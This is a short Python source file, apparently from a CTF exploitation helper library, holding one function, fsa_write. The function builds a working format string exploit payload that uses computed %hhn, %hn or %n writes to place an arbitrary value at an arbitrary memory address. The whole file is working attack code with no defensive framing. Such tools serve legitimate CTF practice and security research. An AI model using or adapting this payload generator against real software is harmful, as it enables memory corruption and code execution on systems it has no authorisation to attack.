from toyotama.pwn.util import fill, p32, p64


def fsa_write(target_addr: int, value: int, nth_stack: int, offset=0, bits=64, each=1):
    """Arbitrary write using format string bug

    Args:
        target_addr (int): The address where the content will be written.
        value (int): The value to write.
        nth_stack (int): example
                    "AAAA%p %p %p..."
                    -> AAAA0x1e 0xf7f6f580 0x804860b 0xf7f6f000 0xf7fbb2f0 (nil) 0x4141d402
                    -> 7th (0x4141d402)
        offset (int, optional): From nth_stack's example, offset is 2 (0x4141d402).
        bits (int, optional): The bits of the target binary.
        each (int, optional): Write the value by each n bytes.
    Returns:
        bytes: The payload
    """
    assert bits in (32, 64)
    assert each in (1, 2, 4)

    pack = p64 if bits == 64 else p32
    bit_len = bits
    byte_len = bit_len // 8

    # Adjust stack alignment
    payload = fill(-offset % byte_len)
    if offset != 0:
        nth_stack += 1

    for i in range(0, byte_len, each):
        payload += pack(target_addr + i)

    format_string = {
        1: "hhn",
        2: "hn",
        4: "n",
    }

    previous_value = 0
    current_value = len(payload)
    for i in range(0, byte_len, each):
        previous_value = current_value
        current_value = value % (1 << 8 * each)
        offset = (current_value - previous_value) % (1 << 8 * each)
        payload += f"%{offset}c%{nth_stack}${format_string[each]}".encode()
        value >>= 8 * each
        nth_stack += 1

    return payload
